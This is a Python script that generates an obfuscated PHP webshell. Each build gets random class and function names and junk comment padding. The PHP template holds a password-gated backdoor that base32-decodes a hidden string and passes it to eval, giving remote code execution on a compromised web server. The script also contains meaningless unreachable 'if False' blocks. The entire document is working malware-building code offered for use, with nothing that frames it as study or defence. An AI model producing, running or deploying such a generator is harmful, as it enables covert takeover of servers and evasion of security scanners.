import random
shell = '<?php\nclass {0}{1}\n        public ${2} = null;\n        public ${3} = null;\n        function __construct(){1}\n            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}\n        $this->{2} = \'mv3gc3bierpvat2tkrnxuzlsn5ossoy\';\n        $this->{3} = @{9}($this->{2});\n        @eval({5}.$this->{3}.{5});\n        {4}{4}{4}\nnew {0}();\nfunction {6}(${7}){1}\n    $BASE32_ALPHABET = \'abcdefghijklmnopqrstuvwxyz234567\';\n    ${8} = \'\';\n    $v = 0;\n    $vbits = 0;\n    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}\n    $v <<= 8;\n        $v += ord(${7}[$i]);\n        $vbits += 8;\n        while ($vbits >= 5) {1}\n            $vbits -= 5;\n            ${8} .= $BASE32_ALPHABET[$v >> $vbits];\n            $v &= ((1 << $vbits) - 1);{4}{4}\n    if ($vbits > 0){1}\n        $v <<= (5 - $vbits);\n        ${8} .= $BASE32_ALPHABET[$v];{4}\n    return ${8};{4}\nfunction {9}(${7}){1}\n    ${8} = \'\';\n    $v = 0;\n    $vbits = 0;\n    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}\n        $v <<= 5;\n        if (${7}[$i] >= \'a\' && ${7}[$i] <= \'z\'){1}\n            $v += (ord(${7}[$i]) - 97);\n        {4} elseif (${7}[$i] >= \'2\' && ${7}[$i] <= \'7\') {1}\n            $v += (24 + ${7}[$i]);\n        {4} else {1}\n            exit(1);\n        {4}\n        $vbits += 5;\n        while ($vbits >= 8){1}\n            $vbits -= 8;\n            ${8} .= chr($v >> $vbits);\n            $v &= ((1 << $vbits) - 1);{4}{4}\n    return ${8};{4}\n?>'

def random_keys(len):
    if False:
        print('Hello World!')
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))

def random_name(len):
    if False:
        i = 10
        return i + 15
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str, len))

def build_webshell():
    if False:
        while True:
            i = 10
    className = random_name(4)
    lef = '{'
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    rig = '}'
    disrupt = '"/*' + random_keys(7) + '*/"'
    fun1 = random_name(4)
    fun1_vul = random_name(4)
    fun1_ret = random_name(4)
    fun2 = random_name(4)
    shellc = shell.format(className, lef, parameter1, parameter2, rig, disrupt, fun1, fun1_vul, fun1_ret, fun2)
    return shellc
if __name__ == '__main__':
    print(build_webshell())